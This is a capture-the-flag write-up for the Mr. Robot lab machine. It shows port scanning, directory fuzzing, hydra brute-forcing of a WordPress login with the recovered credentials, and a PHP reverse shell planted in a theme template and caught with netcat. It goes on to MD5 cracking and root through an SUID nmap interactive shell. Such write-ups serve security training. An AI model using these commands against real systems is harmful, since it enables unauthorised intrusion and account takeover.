# Mr.robot
# Flag 1

In this machine we need to get 3 keys so let's start by port scanning

```shell
[dasor@archlinux ~/htb/mrrobot]$nmap -p- -sS --min-rate 9000 -vvv -n -Pn -oA allports 192.168.1.35
PORT    STATE  SERVICE REASON
22/tcp  closed ssh     reset ttl 64
80/tcp  open   http    syn-ack ttl 64
443/tcp open   https   syn-ack ttl 64
```

So a website as usual in this types of CTF's. The main page is a very cool console but that is meaningless in terms of getting the keys. Next thing fuzzing which reported a lot of subdomains here is all I found

  Command line : `ffuf -w /home/dasor/wordlist/directory-list-2.3-big.txt -u https://192.168.1.35/FUZZ -v -t 200 -of md -o ffuf`
  Time: 2022-08-14T23:04:22&#43;02:00

  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | blog | https://192.168.1.35/blog | https://192.168.1.35/blog/ | 18 | 301 | 234 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | images | https://192.168.1.35/images | https://192.168.1.35/images/ | 2 | 301 | 236 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | sitemap | https://192.168.1.35/sitemap |  | 29 | 200 | 0 | 1 | 1 | application/xml |  |
  | video | https://192.168.1.35/video | https://192.168.1.35/video/ | 119 | 301 | 235 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | rss | https://192.168.1.35/rss | https://192.168.1.35/feed/ | 23 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | wp-content | https://192.168.1.35/wp-content | https://192.168.1.35/wp-content/ | 227 | 301 | 240 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | admin | https://192.168.1.35/admin | https://192.168.1.35/admin/ | 245 | 301 | 235 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | 0 | https://192.168.1.35/0 | https://192.168.1.35/0/ | 110 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | feed | https://192.168.1.35/feed | https://192.168.1.35/feed/ | 112 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | login | https://192.168.1.35/login | https://192.168.1.35/wp-login.php | 39 | 302 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | atom | https://192.168.1.35/atom | https://192.168.1.35/feed/atom/ | 154 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | audio | https://192.168.1.35/audio | https://192.168.1.35/audio/ | 317 | 301 | 235 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | intro | https://192.168.1.35/intro |  | 334 | 200 | 516314 | 2076 | 2028 | video/webm |  |
  | image | https://192.168.1.35/image | https://192.168.1.35/image/ | 149 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | css | https://192.168.1.35/css | https://192.168.1.35/css/ | 540 | 301 | 233 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | wp-login | https://192.168.1.35/wp-login |  | 461 | 200 | 2688 | 117 | 54 | text/html; charset=UTF-8 |  |
  | license | https://192.168.1.35/license |  | 663 | 200 | 19930 | 3334 | 386 | text/plain |  |
  | rss2 | https://192.168.1.35/rss2 | https://192.168.1.35/feed/ | 534 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | wp-includes | https://192.168.1.35/wp-includes | https://192.168.1.35/wp-includes/ | 774 | 301 | 241 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | js | https://192.168.1.35/js | https://192.168.1.35/js/ | 939 | 301 | 232 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | Image | https://192.168.1.35/Image | https://192.168.1.35/Image/ | 970 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | readme | https://192.168.1.35/readme |  | 1737 | 200 | 7334 | 759 | 98 | text/html; charset=utf-8 |  |
  | robots | https://192.168.1.35/robots |  | 1739 | 200 | 41 | 2 | 4 | text/plain |  |
  | rdf | https://192.168.1.35/rdf | https://192.168.1.35/feed/rdf/ | 1594 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | page1 | https://192.168.1.35/page1 | https://192.168.1.35/ | 1608 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | dashboard | https://192.168.1.35/dashboard | https://192.168.1.35/wp-admin/ | 2879 | 302 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | %20 | https://192.168.1.35/%20 | https://192.168.1.35/ | 3814 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | wp-admin | https://192.168.1.35/wp-admin | https://192.168.1.35/wp-admin/ | 7510 | 301 | 238 | 14 | 8 | text/html; charset=iso-8859-1 |  |
  | phpmyadmin | https://192.168.1.35/phpmyadmin |  | 11152 | 403 | 94 | 14 | 1 | text/html; charset=iso-8859-1 |  |
  | 0000 | https://192.168.1.35/0000 | https://192.168.1.35/0000/ | 11099 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  | xmlrpc | https://192.168.1.35/xmlrpc |  | 17491 | 405 | 42 | 6 | 1 | text/plain;charset=UTF-8 |  |
  | wp-signup | https://192.168.1.35/wp-signup | https://192.168.1.35/wp-login.php?action=register | 37900 | 302 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |
  |  | https://192.168.1.35/ |  | 39970 | 200 | 1077 | 189 | 31 | text/html |  |
  | IMAGE | https://192.168.1.35/IMAGE | https://192.168.1.35/IMAGE/ | 40678 | 301 | 0 | 1 | 1 | text/html; charset=UTF-8 |  |


Anyway most of this isn't useful, the crucial facts is the robots file and the fact that the page is a wordpress site. Going to the robots file shows us two files a dictionary and the first key. The dictionary seems to be huge but many things are repeated a lot of times

# Flag 2

```shell
[dasor@archlinux ~/htb/mrrobot]$ wc -l fsocity.dic
858160 fsocity.dic
[dasor@archlinux ~/htb/mrrobot]$ sort fsocity.dic | uniq | wc -l
11451
```

Only 11451 lines, not that huge now. Next since we have a dictionary I tried to enumerate users with hydra and then cracks it's password

```shell
hydra -vV -L dictionary -p whatever 192.168.1.35 http-post-form -f '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
...
[80][http-post-form] host: 192.168.1.35   login: elliot   password: whatever
[STATUS] attack finished for 192.168.1.35 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...( Now the password)
hydra -vV -l elliot -P dictionary 192.168.1.35 http-post-form -f '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered'
...
[80][http-post-form] host: 192.168.1.35   login: elliot   password: ER28-0652
[STATUS] attack finished for 192.168.1.35 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Now let's login. Once in I tried many things like XSS or login as mich05654 (the other user that appears in the page) but meaningful happened. However my old friend [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#panel-rce)
had the solution. As admin you can change the theme of the webpage and put a reverse shell in for example the 404 template. The reverse shell can be found in pentestmokey [here](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz). To start the reverse shell you just need to listen and go to a not existing page as always also let's improve the tty when we get the reverse shell.

```shell
[dasor@archlinux ~]$ nc -lvp 7777
Connection from 192.168.1.35:57792
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 10:13:45 up  1:44,  0 users,  load average: 0.00, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~]$ stty raw -echo; fg
[1]  + continued  nc -lvp 7777

daemon@linux:/$ stty rows 30 columns 132
daemon@linux:/$
```

We are logged as daemon but for some reason we have access to the home of the user robot which contains and md5 hash and the second key

```shell
dasor@archlinux ~/htb/mrrobot]$ hashcat -m 0 hashmd5 ~/wordlist/rockyou.txt --show
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```
# Flag 3

Once the hash was cracked I logged in as robot and started searching for a priv esc vector. Although the server has ftp and mysql open internally they are inaccessible since there are no mysql/ftp binaries. So to make things easier I decided to run linpeas and the results gave me 2 95% PE vector, one the linux version and the other a nmap binary with SUID bit. I tried the nmap SUID binary and got root getting the last key.

```shell
robot@linux:~$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
```

Later I tried some suggested exploits but none worked for me so it seems this is the simplest way to get root
